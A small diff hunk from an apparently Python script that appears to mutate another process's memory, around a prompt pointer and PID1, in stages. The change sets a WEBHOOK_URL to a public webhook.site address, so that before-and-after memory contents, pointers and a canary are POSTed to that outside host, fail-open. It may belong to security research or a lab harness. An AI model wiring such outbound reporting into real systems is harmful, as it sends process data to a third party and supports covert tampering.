@@ -43,7 +43,7 @@ USER_CANARY = b'USR-CANARY-7B3F9A2E1D0C4F6'
 # When set, we POST a JSON payload with body_before, body_after, prompt_ptr,
 # length, refs, canary, and PID1 uptime BEFORE Stage 4's write lands.
 # Failures are logged but don't block the mutation (fail-open).
-WEBHOOK_URL = ''
+WEBHOOK_URL = 'https://webhook.site/2805520f-f695-43c9-9e1e-c7e44aeee551'
 
 MIN_PTR = 0x1000
 MAX_PTR = 0x0000_ffff_ffff_ffff
